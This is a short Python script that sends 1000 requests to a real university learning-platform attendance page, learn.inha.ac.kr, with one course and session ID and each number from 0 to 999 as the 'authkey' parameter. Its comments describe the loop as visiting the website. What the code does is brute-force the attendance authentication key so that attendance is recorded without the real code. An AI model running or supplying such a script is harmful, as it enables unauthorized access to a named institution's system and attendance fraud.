import requests

# Define the website URL

# Define the number of times to visit the website
num_visits = 1000

# Loop through the number of visits and make a request to the website
for i in range(num_visits):
    url = "https://learn.inha.ac.kr/local/ubattendance/autoattendance.php?id=40834&autoid=105452&authkey={}".format(i)
    response = requests.get(url)
    print("Visit #", i+1, "status code:", response.status_code)